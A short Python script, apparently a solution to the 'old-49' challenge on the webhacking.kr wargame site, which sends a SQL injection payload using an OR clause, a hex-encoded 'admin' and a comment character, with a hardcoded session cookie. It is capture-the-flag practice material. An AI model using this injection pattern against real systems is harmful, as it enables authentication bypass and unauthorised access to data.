import requests

url = "https://webhacking.kr/challenge/web-24/?"
cookie = {"PHPSESSID":"hjb4hev90d5u7q3ejvvgigllgq"}

def solve():
    payload = "lv=0||id=0x61646d696e%23"
    res = requests.get(url=url+payload, cookies=cookie)
    if "old-49 Pwned!" in res.text:
        print("old-49 Pwned!")
    elif "already solve" in res.text:
        print("already solve")

if __name__ == "__main__":
    solve()